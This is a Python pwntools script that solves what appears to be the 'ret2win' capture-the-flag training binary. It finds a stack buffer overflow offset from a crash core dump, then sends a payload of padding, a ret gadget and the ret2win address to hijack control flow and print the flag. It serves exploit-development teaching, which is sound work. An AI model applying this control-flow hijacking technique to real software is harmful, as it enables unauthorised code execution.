#!/usr/bin/env python3

from pwn import *

# Many settings in `pwntools` are controlled by the global variable `context`.
context.log_level = "debug"
# Automagically set all appropriate settings for target OS, arch, and bit-width.
context.binary = ELF("./ret2win")

elf = context.binary

io = process(elf.path)
io.sendline(cyclic(128))  # On the CLI: `pwn cyclic 128`

# Wait for the process to crash.
io.wait()

# Open the corefile - remember to enable core dumps.
# `io.corefile` will try and automatically find the core file for the process.
core = io.corefile

# Find the part of the cyclic pattern that has overwritten the return address.
rsp = core.rsp
pattern = core.read(rsp, 4)

offset = cyclic_find(pattern)

info("%r pattern found at offset %#x", pattern, offset)

payload = flat(
    b"A" * offset,
    p64(0x400755),  # `pwnme`'s ret `0x0000000000400755 <+109>:   ret`
    p64(elf.symbols.ret2win),
)

# Write the payload to text file so we can pass it on the commandline if needed.
# For example, with GDB.
with open("payload.bin", "wb") as f:
    f.write(payload)

info("Sending new payload: %r", payload)

# Send the payload to a new copy of the process.
io = process(elf.path)
io.sendline(payload)
io.recvuntil(b"Here's your flag:\n")
flag = io.recvline().strip().decode()
success(flag)
